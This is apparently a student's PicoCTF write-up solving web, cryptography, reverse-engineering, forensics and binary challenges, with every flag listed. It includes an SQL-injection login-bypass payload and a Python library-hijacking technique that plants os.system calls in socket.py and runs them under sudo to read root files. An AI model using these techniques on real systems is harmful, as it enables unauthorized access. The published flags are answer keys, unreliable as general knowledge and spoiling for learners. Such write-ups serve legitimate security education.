
# Pwn$t4r5 PicoCTF Write-Up

My report for a few questions questions that I have solved on PicoCTF.


## Web Exploitation

### [Roboto Sans](https://play.picoctf.org/practice/challenge/291)

This web exploitation challenge is about the `robots.txt` file. Initially I thought this had something to do with the fonts and Google Fonts API. But after going through the description a couple of times, I thought it was some endpoint on the server. So I ran an endpoint scan using an application called `deluge`. I found that `/robots.txt` is open. Generally this file is used for search engines to tell them what endpoints are accessible to the crawlers. But this file also contains some other info.

    User-agent *
    Disallow: /cgi-bin/
    Think you have seen your flag or want to keep looking.

    ZmxhZzEudHh0;anMvbXlmaW
    anMvbXlmaWxlLnR4dA==
    svssshjweuiwl;oiho.bsvdaslejg
    Disallow: /wp-admin/

After running `anMvbXlmaWxlLnR4dA==` through a base64 decoder, I got another path.

    js/myfile.txt

This endpoint had the flag.

Flag: `picoCTF{Who_D03sN7_L1k5_90B0T5_032f1c2b}`

### [Irish-Name-Repo 1](https://play.picoctf.org/practice/challenge/80)

This challenge is based on a basic SQL injection. When I landed on the website, I immediately looked for a login page. It was present at this page:

    https://jupiter.challenges.picoctf.org/problem/33850/login.php

Once I am here, I inspected the page any possible hints. There I came across a hidden field named `debug` whose value was `0`. I changed it to `1` and tried to login with random credentials. What I got is:

    username: eee
    password: eee
    SQL query: SELECT * FROM users WHERE name='eee' AND password='eee'

    Login failed.

From here, it is basic SQL injection. My payload was:

    ' OR '1'='1' --

Once I injected it, I was able to login. This is what I got:

    username: eee
    password: ' OR '1'='1' --
    SQL query: SELECT * FROM users WHERE name='eee' AND password='' OR '1'='1' --'

    Logged in!

    Your flag is: picoCTF{s0m3_SQL_f8adf3fb}

Flag: `picoCTF{s0m3_SQL_f8adf3fb}`

### [Secrets](https://play.picoctf.org/practice/challenge/296)

In this challenge, we look at the page's source code to find endpoints.

First we are led to a [homepage](http://saturn.picoctf.net:65455/) of a website. By inspecting the page's source, we can see that the stylesheet reference link is `/secret/assets/index.css`. 

Now if we go to `http://saturn.picoctf.net:65455/secret/assets/index.css`, we won't find anything. So let's go to `http://saturn.picoctf.net:65455/secret` instead. By vieweing this page's source, we can see that the stylesheet reference link is `/hidden/file.css`. 

Again we are not supposed to check the `file.css`, but we go to `http://saturn.picoctf.net:65455/secret/hidden` instead. Here we will find a new endpoint `/superhidden`. 

In `http://saturn.picoctf.net:65455/secret/hidden/superhidden` we will the find the flag.

Flag: `picoCTF{succ3ss_@h3n1c@10n_39849bcf}`


## Cryptography

### [Mr-Worldwide](https://play.picoctf.org/practice/challenge/40)

This challenge presents us with a text file with the following content.

    picoCTF{(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)}

The numbers look like coordinates. If we use [google maps](maps.google.com), we can find their locations.

|Coordinates           |Location                  |
|----------------------|--------------------------|
|35.028309, 135.753082 |**K**yoto                 |
|46.469391, 30.740883  |**O**desa                 |
|39.758949, -84.191605 |**D**ayton                |
|41.015137, 28.979530  |**I**stanbul              |
|24.466667, 54.366669  |**A**bu Dhabi             |
|3.140853, 101.693207  |**K**uala Lumpur          |
|9.005401, 38.763611   |**A**ddis Ababa           |
|-3.989038, -79.203560 |**L**oja                  |
|52.377956, 4.897070   |**A**msterdam             |
|41.085651, -73.858467 |**S**leepy Hollow         |
|57.790001, -152.407227|**K**odiak                |
|31.205753, 29.924526  |**A**lexandria Governorate|

From this table, we can make out the flag using the first letters of the locations.

Flag: `picoCTF{kodiak_alaska}`

### [waves over lambda](https://play.picoctf.org/practice/challenge/38)

The challenge prompts us to connect to a server using netcat.

    jupiter.challenges.picoctf.org 43522

When we connect to the server, we will recieve a ciphertext.
    
    guvcfaej nqfq lj dubf ozac - ofqkbqvgd_lj_g_uwqf_zasmya_ucosabvfao

    nawlvc nay jusq elsq ae sd yljtujaz pnqv lv zuvyuv, l nay wljleqy enq mfleljn sbjqbs, avy sayq jqafgn asuvc enq muuhj avy satj lv enq zlmfafd fqcafylvc efavjdzwavla; le nay jefbgh sq enae jusq oufqhvupzqycq uo enq gubvefd gubzy nafyzd oalz eu nawq jusq lstufeavgq lv yqazlvc plen a vumzqsav uo enae gubvefd. l olvy enae enq yljeflge nq vasqy lj lv enq qxefqsq qaje uo enq gubvefd, rbje uv enq mufyqfj uo enfqq jeaeqj, efavjdzwavla, suzyawla avy mbhuwlva, lv enq slyje uo enq gaftaenlav subvealvj; uvq uo enq plzyqje avy zqaje hvupv tufeluvj uo qbfutq. l paj vue amzq eu zlcne uv avd sat uf pufh clwlvc enq qxage zugazled uo enq gajezq yfagbza, aj enqfq afq vu satj uo enlj gubvefd aj dqe eu gustafq plen ubf upv ufyvavgq jbfwqd satj; mbe l oubvy enae mljeflei, enq tuje eupv vasqy md gubve yfagbza, lj a oalfzd pqzz-hvupv tzagq. l jnazz qveqf nqfq jusq uo sd vueqj, aj enqd sad fqofqjn sd sqsufd pnqv l eazh uwqf sd efawqzj plen slva.

We can put this in a cipher detector available online. This is most likely a substitution cipher. After using an [online tool](https://www.guballa.de/substitution-solver) we will get the flag. But the flag is not to be submitted in the usual formal, so we are going to submit it as is.

Flag: `frequency_is_c_over_lambda_ogfmaunraf`

### [Very Smooth](https://play.picoctf.org/practice/challenge/315)

This is a RSA encryption challenge. We are given two files, `gen.py` and `output.txt`. The python file is a RSA encryption tool which was used to encrypt a text. But since we know how RSA works, we don't need to touch that. The text file contains two values, `n` and `c`. These two values are enough to solve the challenge.

    n = b03ea698ce2b51fb00e11e6fbaf1e5373dc5b0c70eb2b14a36d21e8667be8774eee51f6050a10237f6b24f21204fc8013681e7ed72ed051188f3274aae8f1de0d39389b514c196fa82c98a270bfabefd044da8c687b0e114ebbde82536c0709ac5ad81bfe0077e9d9b798ad5abecee52767e68f8060c45936521fd93893102eb1676f2ff41324a7a6b3dff2e830538e06d25934e9f14bf6b40ab5674fe648e314bf06f84282f5ef52bc1401de3a42eb66e64bcdadd2674348e5bdb7016feda44d719af387a948ad81cbaed10213dd930fc7bc7677d8c4cdab0645d0ff15e6ad6ca37135942c3be08f23e7be0992c8b3370dcdc31045e086d823107fb2e443dc9
& 

    c = a913a96e215b5aa79c702d27fa375c73d06787639c4131fb32877cafefaa8faf70e15f6a17ef2a9a6f5310b157cb287b740e77cb5385081d1853a9104bc16357b259fa2d146bd87398d4ef6f1c078289812952c67792cf9cd745049aeb9d4ab4dff2825a9c0b3381f19b2a67164f9d4de33c25f98bc2f224feb5507b531e1a1c7be5ed2d8ddd01f3fae37245e8cf99c75a21848993d445e1d6d69d555a3e6cc8055704fdde88df9084bda3ea65a9384fa64bf8df4d88946449526320c15d4d2d871638070489adf3f8c95caffeab40b0d137a9319be20cdf6ebbaf037f62093d9bd33edd4ffd7e1929b9ab06252956fd85250a0515ef2b4e035017be5702cdd3

After converting them from hex to decimal, we get the following values.

    n = 22248835919725953986586490995651267090659585415611006405844489316811442761734894932989220066243957588815427353346106561341737865955218249998999073894801662704787952216037378694520406120028585315397806022568223960273182979419881702373864971866713605064079383879886465206256857463383794805208880195555473943535011818556843194328906218027326188074415497452378206846226433318482231017228317299321586664737832712426811340749089339114085237569479481150659368749260683570681573854690514502288114352550604959612140958182705886243892293470900483438764951015970854350472418198656565846552168800045192802100391435754316226641353
&

    c = 21343969152303599288737668210590410337887698054027979442134921786165747049202998680970108837832254484243720626476163440983573532994560187221065308498856296929601292160276588112888019526898489926956363344177703609039993618683663635278450425957314952630778320527539765858923339509890033632693156894770718703951018349852920523029400270701740551791601638050880600441966193440248085779995414168459867850325126393146544133160516229794716613793535664582307845531589362887339275321560001542666765369327147472050494258417915737771318174687300728011526356943538441369461472557166457921743538435431747893100164699368804101311955

We can use online tools like [dcode.fr](https://www.dcode.fr/rsa-cipher) to decrypt the text.

Flag: `picoCTF{p0ll4rd_f4ct0r1z4at10n_FTW_376ebfe7}`


## Reverse Engineering

### [timer](https://play.picoctf.org/practice/challenge/381)

This challenge gives us an APK file named `timer.apk`. As this is a challenge of rev, we will decompile it first using online tools like [decompiler.com](https://www.decompiler.com/).

After we decompile it, we will see two folders.

- resources
- sources

Usually, the important build files are found in `com` folder which is inside `sources folder`.

- resources
- sources
    - android/support/v4 	
    - androidx 	
    - com
        - example/timer 	
        - google
    - kotlin 	
    - org

We can see that `com` folder has another two folders named `example/timer` and `google`. Lets check the first one. 

- resources
- sources
    - android/support/v4 	
    - androidx 	
    - com
        - example/timer
            - BuildConfig.java 	
            - MainActivity$$ExternalSyntheticLambda0.java 	
            - MainActivity$startCountingDown$1.java 	
            - MainActivity.java 	
            - R.java	
        - google
    - kotlin 	
    - org

Lets check the contents of each file.

`BuildConfig.java`

        package com.example.timer;

    public final class BuildConfig {
        public static final String APPLICATION_ID = "com.example.timer";
        public static final String BUILD_TYPE = "debug";
        public static final boolean DEBUG = Boolean.parseBoolean("true");
        public static final int VERSION_CODE = 1;
        public static final String VERSION_NAME = "picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}";
    }

Here is our flag!

Flag: `picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}`

### [Picker I](https://play.picoctf.org/practice/challenge/400)

The challenge asks us to connect to a server using netcat.

After we connect, we can figure out that it is a terminal emulator made in python. So lets run try to get all the commands available.

    print(globals())
    
We will be able to see a function named `win`. Lets call it and check the output.

    0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d

This is a hex data. By running it through a translator and getting its ASCII equivalent, we will get the flag.

Flag: `picoCTF{4_d14m0nd_1n_7h3_r0ugh_6e04440d}`

### [unpackme](https://play.picoctf.org/practice/challenge/313)

This is a challenge where we use tools like binary ninja or ghidra to disassemble an application. Here we recieve a file named `unpackme-upx`. Before we run the file, we need to give it the permissions to be executable.

    chmod +x unpackme-upx

We will get a prompt asking us `What's my favorite number?`. Not like we can guess its favorite number, lets disassemble it. By verifying its hex data with [file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures), we will know that its a `.upx` compressed file (it is also given in the name of the file itself). Using the `upx` tool, we can decompress it.

    upx -kd unpackme-upx

And then by using ghidra, we can disassemble the decompressed application. Lets check the `main` function.

    undefined8
    main(undefined8 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
        undefined4 param_6,undefined4 param_7,undefined4 param_8)

    {
    undefined8 in_RCX;
    ulong uVar1;
    undefined8 extraout_RDX;
    undefined8 extraout_RDX_00;
    undefined8 extraout_RDX_01;
    undefined8 uVar2;
    undefined in_SIL;
    int *piVar3;
    char *pcVar4;
    mbstate_t in_R8;
    mbstate_t in_R9;
    long in_FS_OFFSET;
    undefined4 extraout_XMM0_Da;
    int local_44;
    char *local_40;
    undefined8 local_38;
    undefined8 local_30;
    undefined8 local_28;
    undefined4 local_20;
    undefined2 local_1c;
    ulong local_10;
    
    local_10 = *(ulong *)(in_FS_OFFSET + 0x28);
    local_38 = 0x4c75257240343a41;
    local_30 = 0x30623e306b6d4146;
    local_28 = 0x3532666630486637;
    local_20 = 0x36665f60;
    local_1c = 0x4e;
    printf("What\'s my favorite number? ");
    piVar3 = &local_44;
    __isoc99_scanf(extraout_XMM0_Da,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
                    (mbstate_t)0x4b3020,piVar3,extraout_RDX,in_RCX,in_R8,in_R9,in_SIL);
    if (local_44 == 0xb83cb) {
        local_40 = rotate_encrypt(0,(char *)&local_38);
        piVar3 = (int *)stdout;
        fputs(local_40,(FILE *)stdout);
        putchar(10);
        pcVar4 = local_40;
        free(local_40);
        uVar2 = extraout_RDX_00;
    }
    else {
        pcVar4 = "Sorry, that\'s not it!";
        puts("Sorry, that\'s not it!");
        uVar2 = extraout_RDX_01;
    }
    uVar1 = local_10 ^ *(ulong *)(in_FS_OFFSET + 0x28);
    if (uVar1 != 0) {
                        /* WARNING: Subroutine does not return */
        __stack_chk_fail(pcVar4,piVar3,uVar2,uVar1,in_R8,in_R9);
    }
    return 0;
    }

Here, the code is checking if the number we gave is `0xb83cb` or not. This is hexadecimal for the number `754635`. When we give this number to the application, we will get the flag.

Flag: `picoCTF{up><_m3_f7w_77ad107e}`


## Forensics

### [hideme](https://play.picoctf.org/practice/challenge/350)

We are introduced to an image named `flag.png`. Lets use the command `strings` on this file.

    strings flag.png

In the ouput, we can see that there is a folder named `secret` and a file named `flag.png` (yes another one) inside the folder. Lets use `binwalk` to extract the image.

    binwalk -e flag.png

Now in the secrets folder inside our extracted folder, we can find the `flag.png` file which has the flag.

Flag: `picoCTF{Hiddinng_An_imag3_within_@n_ima9e_dc2ab58f}`

### [Milkslap](https://play.picoctf.org/practice/challenge/139)

When we open the challenge page, we will notice a milk glass emoji, which is a redirection to a website. In the website, we will find a moving png, also known as `apng` whose extension is same as a normal `png` file. Lets download this and check its data.

In the properties tab, we don't find anything. Lets run `strings` command on this.

    strings concat_v.png
    strings concat_v.png | grep pic
    strings concat_v.png | grep picoCTF

We can't find any data matching our search string. Lets use `zsteg` to analyse the image.

    zsteg concat_v.png

Ran into some memories issues with ruby but finally we will be able to get the flag from this command itself.

Flag: `picoCTF{imag3_m4n1pul4t10n_sl4p5}`

### [Pitter, Patter, Platters](https://play.picoctf.org/practice/challenge/87)

We are asked to download a file named `suspicious.dd.sda1`, which is a file system image. Lets mount it and check what's in there.

    mkdir sus
    sudo mount suspicious.dd.sda1 ~/sus

Here we will find a text file named `suspicious-file.txt` which has the following content.

    Nothing to see here! But you may want to look here -->

What are we missing here? We cannot access the `lost+found` directory. After checking all the files, I couldn't find anything. Lets try using `strings` command on this to see its data.

    strings suspicious.dd.sda1
    strings suspicious.dd.sda1 | grep picoCTF

We don't get anything meaningful here. For the second command, we don't even get any output. Lets try opening this with 16 bit encoding.

    strings -e b suspicious.dd.sda1

The output is as follows.

    6b7d549b_3<_|Lm_111t5_3b{FTCocip
    qQWTYUiIOPb
    FGjJKLs
    ZXvc
    #+3;CScs
    !1Aa
    qQWTYUiIOPb
    FGjJKLs
    ZXvc
    #+3;CScs
    !1Aa
    #+3;CScs
    !1Aa
    7777777777

Here we can see the flag but in reverse, so lets turn it.

    strings -e b suspicious.dd.sda1 | rev

The output is

    picoCTF{b3_5t111_mL|_<3_b945d7b6
    bPOIiUYTWQq
    sLKJjGF
    cvXZ
    scSC;3+#
    aA1!
    bPOIiUYTWQq
    sLKJjGF
    cvXZ
    scSC;3+#
    aA1!
    scSC;3+#
    aA1!
    7777777777

Here we have the flag, just add a `}` at the end.

Flag: `picoCTF{b3_5t111_mL|_<3_b945d7b6}`


## Binary Exploitation

### [two-sum](https://play.picoctf.org/practice/challenge/382)

![Name?](https://c.tenor.com/kHcmsxlKHEAAAAAC/rock-one-eyebrow-raised-rock-staring.gif)

When we launch the instance, we will get a source file for a C program. It is a program which compared two numbers. Here we need to get the integer to overflow in order to get the flag.

To do that, lets check the max value that `int` datatype can take. It is `2147483647`. So lets give `2147483648` as one input and some random number as other one.

    n1 > n1 + n2 OR n2 > n1 + n2
    What two positive numbers can make this possible:
    2147483648
    1
    You entered -2147483648 and 1
    No overflow

We don't get any overflow. Lets give the number itself and try

    n1 > n1 + n2 OR n2 > n1 + n2
    What two positive numbers can make this possible:
    2147483647
    5
    You entered 2147483647 and 5
    You have an integer overflow
    YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_76f333c8}

Here we got the flag!

Flag: `picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_76f333c8}`

### [hijacking](https://play.picoctf.org/practice/challenge/352)

This one was tough and took me a lot of attempts :sob:

We are given access to a server that we are to connect using `ssh`. In the server, when we use `ls` command, we don't get any output. So lets use the `--all` and `--long` parameters along with the command.

    ls -al

The output is

    total 16
    drwxr-xr-x 1 picoctf picoctf   20 Feb 24 16:05 .
    drwxr-xr-x 1 root    root      21 Aug  4  2023 ..
    -rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
    -rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
    drwx------ 2 picoctf picoctf   34 Feb 24 16:05 .cache
    -rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
    -rw-r--r-- 1 root    root     375 Mar 16  2023 .server.py

We are particularly interested in `.server.py`. So lets cat it.

    cat .server.py

The output is

    import base64
    import os
    import socket
    ip = 'picoctf.org'
    response = os.system("ping -c 1 " + ip)
    #saving ping details to a variable
    host_info = socket.gethostbyaddr(ip)
    #getting IP from a domaine
    host_info_to_str = str(host_info[2])
    host_info = base64.b64encode(host_info_to_str.encode('ascii'))
    print("Hello, this is a part of information gathering",'Host: ', host_info)

When we run this file, we don't get any interesting output. As the hint of the challenge says, we need to find a way to access the administrator commands. We can do that by using the `os` module of python. But we can access it only from python's modules. So let's edit them. But first we gotta find where they are. We can do so by giving the following command.

    find / -name socket.py

We will eventually find the file.

    /usr/lib/python3.8/socket.py

We can edit this file and access the administrator commands. To do so, add the following line in `socket.py` code, on top.

    import os

    os.system('ls -al /challenge')

Now run the `.server.py` file with `sudo`.

    sudo python3 .server.py

We will get the following output.

    total 4
    d--------- 1 root root   6 Aug  4  2023 .
    drwxr-xr-x 1 root root  51 Feb 24 16:05 ..
    -rw-r--r-- 1 root root 103 Aug  4  2023 metadata.json
    sh: 1: ping: not found
    Traceback (most recent call last):
    File "/home/picoctf/.server.py", line 7, in <module>
        host_info = socket.gethostbyaddr(ip)
    socket.gaierror: [Errno -5] No address associated with hostname

Nice, now we know there's a file named `metadata.json` in that folder. Lets cat it by adding another line in `socket.py`

    os.system('cat challenge/metadata.json')

The output is

    total 4
    d--------- 1 root root   6 Aug  4  2023 .
    drwxr-xr-x 1 root root  51 Feb 24 16:05 ..
    -rw-r--r-- 1 root root 103 Aug  4  2023 metadata.json
    {"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}", "username": "picoctf", "password": "jyQXGXxIEP"}sh: 1: ping: not found
    Traceback (most recent call last):
    File "/home/picoctf/.server.py", line 7, in <module>
        host_info = socket.gethostbyaddr(ip)
    socket.gaierror: [Errno -5] No address associated with hostname

Voila, the flag!

Flag: `picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}`

### [RPS](https://play.picoctf.org/practice/challenge/293)

This challenge is based on rock, paper, scissors game. There is a program on a server which plays the game against you. The source code of the computer is given.

    #include <stdio.h>
    #include <stdlib.h>
    #include <stdbool.h>
    #include <string.h>
    #include <time.h>
    #include <unistd.h>
    #include <sys/time.h>
    #include <sys/types.h>


    #define WAIT 60



    static const char* flag = "[REDACTED]";

    char* hands[3] = {"rock", "paper", "scissors"};
    char* loses[3] = {"paper", "scissors", "rock"};
    int wins = 0;



    int tgetinput(char *input, unsigned int l)
    {
        fd_set          input_set;
        struct timeval  timeout;
        int             ready_for_reading = 0;
        int             read_bytes = 0;
        
        if( l <= 0 )
        {
        printf("'l' for tgetinput must be greater than 0\n");
        return -2;
        }
        
        
        /* Empty the FD Set */
        FD_ZERO(&input_set );
        /* Listen to the input descriptor */
        FD_SET(STDIN_FILENO, &input_set);

        /* Waiting for some seconds */
        timeout.tv_sec = WAIT;    // WAIT seconds
        timeout.tv_usec = 0;    // 0 milliseconds

        /* Listening for input stream for any activity */
        ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
        /* Here, first parameter is number of FDs in the set, 
        * second is our FD set for reading,
        * third is the FD set in which any write activity needs to updated,
        * which is not required in this case. 
        * Fourth is timeout
        */

        if (ready_for_reading == -1) {
            /* Some error has occured in input */
            printf("Unable to read your input\n");
            return -1;
        } 

        if (ready_for_reading) {
            read_bytes = read(0, input, l-1);
            if(input[read_bytes-1]=='\n'){
            --read_bytes;
            input[read_bytes]='\0';
            }
            if(read_bytes==0){
                printf("No data given.\n");
                return -4;
            } else {
                return 0;
            }
        } else {
            printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
            return -3;
        }

        return 0;
    }


    bool play () {
    char player_turn[100];
    srand(time(0));
    int r;

    printf("Please make your selection (rock/paper/scissors):\n");
    r = tgetinput(player_turn, 100);
    // Timeout on user input
    if(r == -3)
    {
        printf("Goodbye!\n");
        exit(0);
    }

    int computer_turn = rand() % 3;
    printf("You played: %s\n", player_turn);
    printf("The computer played: %s\n", hands[computer_turn]);

    if (strstr(player_turn, loses[computer_turn])) {
        puts("You win! Play again?");
        return true;
    } else {
        puts("Seems like you didn't win this time. Play again?");
        return false;
    }
    }


    int main () {
    char input[3] = {'\0'};
    int command;
    int r;

    puts("Welcome challenger to the game of Rock, Paper, Scissors");
    puts("For anyone that beats me 5 times in a row, I will offer up a flag I found");
    puts("Are you ready?");
    
    while (true) {
        puts("Type '1' to play a game");
        puts("Type '2' to exit the program");
        r = tgetinput(input, 3);
        // Timeout on user input
        if(r == -3)
        {
        printf("Goodbye!\n");
        exit(0);
        }
        
        if ((command = strtol(input, NULL, 10)) == 0) {
        puts("Please put in a valid number");
        
        } else if (command == 1) {
        printf("\n\n");
        if (play()) {
            wins++;
        } else {
            wins = 0;
        }

        if (wins >= 5) {
            puts("Congrats, here's the flag!");
            puts(flag);
        }
        } else if (command == 2) {
        return 0;
        } else {
        puts("Please type either 1 or 2");
        }
    }

    return 0;
    }

Here, in the line 141, we can see that if the number of wins is greater than or equal to 5, we will recieve the flag. But to get straight 5 wins against the bot is based on our luck, or some C knowledge. Because if we look at line 100, the code is checking if we won or not by using the `strstr` function. This function checks if two strings have a common substring, and if they do, the substring is returned. So all we need to do is give `rockpaperscissors` as our input, as the function will return some value all the time.

    Welcome challenger to the game of Rock, Paper, Scissors
    For anyone that beats me 5 times in a row, I will offer up a flag I found
    Are you ready?
    Type '1' to play a game
    Type '2' to exit the program
    1
    1


    Please make your selection (rock/paper/scissors):
    rockpaperscissors
    rockpaperscissors
    You played: rockpaperscissors
    The computer played: paper
    You win! Play again?
    Type '1' to play a game
    Type '2' to exit the program
    1
    1


    Please make your selection (rock/paper/scissors):
    rockpaperscissors
    rockpaperscissors
    You played: rockpaperscissors
    The computer played: rock
    You win! Play again?
    Type '1' to play a game
    Type '2' to exit the program
    1
    1


    Please make your selection (rock/paper/scissors):
    rockpaperscissors
    rockpaperscissors
    You played: rockpaperscissors
    The computer played: scissors
    You win! Play again?
    Type '1' to play a game
    Type '2' to exit the program
    1
    1


    Please make your selection (rock/paper/scissors):
    rockpaperscissors
    rockpaperscissors
    You played: rockpaperscissors
    The computer played: scissors
    You win! Play again?
    Type '1' to play a game
    Type '2' to exit the program
    1
    1


    Please make your selection (rock/paper/scissors):
    rockpaperscissors
    rockpaperscissors
    You played: rockpaperscissors
    The computer played: rock
    You win! Play again?
    Congrats, here's the flag!
    picoCTF{50M3_3X7R3M3_1UCK_B69E01B8}

And now we got the flag!

Flag: `picoCTF{50M3_3X7R3M3_1UCK_B69E01B8}`